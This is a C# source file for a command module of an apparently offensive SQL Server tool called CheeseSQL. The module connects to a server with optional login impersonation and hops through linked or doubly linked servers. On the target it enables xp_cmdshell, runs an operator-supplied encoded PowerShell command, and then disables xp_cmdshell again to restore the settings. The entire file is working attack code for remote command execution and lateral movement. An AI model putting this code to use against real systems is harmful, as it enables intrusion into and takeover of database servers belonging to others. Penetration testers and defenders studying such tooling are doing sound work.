using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class linkedqueryxp : ICommand
    {
        public static string CommandName => "linkedquery";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/target:TARGET " +
                $"/command:COMMAND " +
                $"[/impersonate:USER] " +
                $"[/impersonate-linked:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string target = "";
            string cmd = "";
            string impersonate = "";
            string intermediate = "";
            string impersonate_linked = "";
            string impersonate_intermediate = "";

            bool sqlauth = arguments.ContainsKey("/sqlauth");

            arguments.TryGetValue("/impersonate", out impersonate);
            arguments.TryGetValue("/intermediate", out intermediate);
            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);

            if (!arguments.TryGetValue("/db", out database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/server", out connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/target", out target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/command", out cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            var queries = new List<string>();

            queries.Add("SELECT 1 as 'Enabling Advanced Options'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
            queries.Add("SELECT 1 as 'Enabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
            queries.Add($"SELECT 1 as 'Executing command'; EXEC xp_cmdshell 'powershell -enc {cmd}';");
            queries.Add("SELECT 1 as 'Disabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
            queries.Add("SELECT 1 as 'Disabling Advanced Options'; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");

            foreach (string query in queries)
            {
                if (String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteLinkedQuery(connection, query, target, impersonate, impersonate_linked);
                }
                else 
                {
                    SQLExecutor.ExecuteDoublyLinkedQuery(connection, query, target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
                }
            }

            connection.Close();
        }
    }
}
